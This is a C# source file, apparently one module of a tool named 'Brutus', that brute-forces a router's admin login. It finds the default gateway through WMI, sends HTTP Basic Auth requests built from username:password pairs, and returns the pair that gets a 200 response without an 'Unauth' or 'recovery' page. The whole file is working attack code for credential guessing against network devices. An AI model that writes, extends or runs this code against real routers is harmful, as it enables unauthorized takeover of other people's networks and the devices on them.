using System;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Management;
using System.Windows.Forms;

namespace Brutus.Modules
{
    /// <summary>
    /// A Module To Brute Force Router Logins
    /// </summary>
    internal class Router
    {
        internal static string GATEWAY { get { return GetGateway(); } }
        private static HttpClient http = new HttpClient();
        private static System.Net.Http.Headers.HttpResponseHeaders HEADER { get; set; }

        internal static string SendLogin(string userpass)
        {
            if (HEADER == null) { CaptureReponseHeader(); }
            string[] combo = userpass.Split(':');
            var auth = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(combo[0] + ":" + combo[1]));
            HttpRequestMessage message = new HttpRequestMessage(new HttpMethod("GET"), "http://" + GATEWAY);
            HEADER.ToList().ForEach(x =>
            {
                message.Headers.Add(x.Key, x.Value);
            });
            message.Headers.Add("Authorization", "Basic " + auth);
            var response = http.SendAsync(message);
            var r_msg = Encoding.Unicode.GetString(response.Result.Content.ReadAsByteArrayAsync().Result);
            if (response.Result.StatusCode == HttpStatusCode.OK && !r_msg.Contains("recovery") && !r_msg.Contains("Unauth"))
            {
                HEADER = null;
                return Encoding.Default.GetString(Convert.FromBase64String(auth));
            }

            return null;
        }

        private static void CaptureReponseHeader()
        {
            HttpRequestMessage ProbeMsg = new HttpRequestMessage(new HttpMethod("GET"), "http://" + GATEWAY);
            HEADER = http.SendAsync(ProbeMsg).Result.Headers;
        }

        private static string GetGateway()
        {
            var query = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration");

            foreach (var item in query.Get())
            {
                var itema = item["DefaultIPGateway"];
                if (itema != null)
                {
                    return ((string[])itema)[0];
                }
            }
            return null;
        }
    }
}